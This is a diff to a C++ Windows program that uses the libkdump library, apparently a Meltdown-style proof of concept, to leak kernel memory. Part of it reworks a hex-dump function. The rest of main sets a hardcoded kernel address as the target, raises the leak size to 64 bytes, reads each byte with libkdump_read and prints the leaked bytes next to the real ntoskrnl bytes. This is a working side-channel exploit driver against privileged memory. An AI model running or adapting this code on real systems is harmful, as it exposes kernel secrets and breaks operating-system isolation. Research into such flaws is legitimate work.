@@ -2,28 +2,35 @@
 
 #include "libkdump.h"
 
-void hex_dump(gsl::span<std::byte> data, std::ostream& os, std::ptrdiff_t width) {
+void hex_dump(std::ostream& os, void* base_address, gsl::span<std::byte> data) {
+	std::size_t numeric_address = reinterpret_cast<std::size_t>(base_address);
+	const std::ptrdiff_t width = 16;
 	const auto start = data.begin();
 	const auto end = data.end();
 	auto line = start;
 	while(line != end) {
-		os.width(4);
+		os.width(16);
 		os.fill('0');
-		os << std::hex << line - start << ": ";
-		const std::ptrdiff_t line_length = std::min(width, end - line);
+		os << std::hex << std::nouppercase << numeric_address + std::distance(start, line) << ": ";
+		const std::ptrdiff_t line_length = std::min(width, std::distance(line, end));
+		std::ptrdiff_t i = 0;
+		for(auto next = line; next != end && next != line + width; ++next) {
+			const char ch = static_cast<char>(*next);
+			os.width(2);
+			os.fill('0');
+			os << std::hex << std::uppercase << static_cast<unsigned int>(static_cast<unsigned char>(ch));
+			if(++i == 8) {
+				os << "-";
+			} else {
+				os << " ";
+			}
+		}
 		for(auto next = line; next != end && next != line + width; ++next) {
 			const char ch = static_cast<char>(*next);
 			os << (ch < 32 ? '.' : ch);
 		}
 		if(line_length != width) {
 			os << std::string(gsl::narrow_cast<std::size_t>(width - line_length), ' ');
-		}
-		for(auto next = line; next != end && next != line + width; ++next) {
-			const char ch = static_cast<char>(*next);
-			os << " ";
-			os.width(2);
-			os.fill('0');
-			os << std::hex << std::uppercase << static_cast<unsigned int>(static_cast<unsigned char>(ch));
 		}
 		os << std::endl;
 		line = line + line_length;
@@ -77,12 +84,9 @@ int main() {
 	HMODULE ntoskrnl(::LoadLibraryW(L"ntoskrnl.exe"));
 	auto f = gsl::finally([=]() { ::FreeLibrary(ntoskrnl); });
 
-	//void* const target = reinterpret_cast<void*>(0xfffff802'd6d62320);
-	void* const target = kernel_base;
-	const std::uint64_t bytes_to_leak = 16;
-
-	//MEMORY_BASIC_INFORMATION mbi = { 0 };
-	//::VirtualQuery(kernel_base, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
+	void* const target = reinterpret_cast<void*>(0xfffff802'd6d62320);
+	//void* const target = kernel_base;
+	const std::uint64_t bytes_to_leak = 64;
 
 	std::unique_ptr<std::byte[]> buffer = std::make_unique<std::byte[]>(bytes_to_leak);
 	std::cout << "leaking " << target << std::endl;
@@ -99,10 +103,10 @@ int main() {
 		buffer[i] = libkdump_read(reinterpret_cast<std::size_t>(static_cast<std::byte*>(target) + i));
 	}
 	std::cout << "Leaked:" << std::endl;
-	hex_dump(gsl::make_span(buffer.get(), bytes_to_leak), std::cout, 16);
+	hex_dump(std::cout, target, gsl::make_span(buffer.get(), bytes_to_leak));
 	std::cout << std::endl;
 	std::cout << "Actual:" << std::endl;
-	hex_dump(gsl::make_span(reinterpret_cast<std::byte*>(ntoskrnl), bytes_to_leak), std::cout, 16);
+	hex_dump(std::cout, target, gsl::make_span(reinterpret_cast<std::byte*>(ntoskrnl), bytes_to_leak));
 
 
 	libkdump_cleanup();
